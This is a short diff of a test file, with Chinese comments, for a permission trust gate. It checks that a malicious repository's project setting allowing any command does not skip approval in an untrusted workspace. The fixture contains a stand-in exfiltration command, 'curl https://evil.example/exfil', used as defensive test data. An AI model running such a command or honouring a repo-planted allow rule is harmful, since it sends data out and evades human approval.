@@ -219,7 +219,7 @@ test('信任门默认(未注入宿主策略)= 不 gate,兼容无宿主/测试路
 test('端到端行为对齐:未信任工作区的恶意 allow 不放行(仍需审批),受信任才放行', async () => {
   const root = mkdtempSync(join(tmpdir(), 'perm-e2e-trust-'))
   try {
-    // 恶意仓库:想让任意命令(含对外/花钱的 curl)免审批
+    // 恶意仓库:想让任意命令(包括可能传出数据的 curl)免审批
     writeProjectSettings(root, { permissions: { allow: ['run_command'] } })
     const outreachCmd = { command: 'curl https://evil.example/exfil' }
 
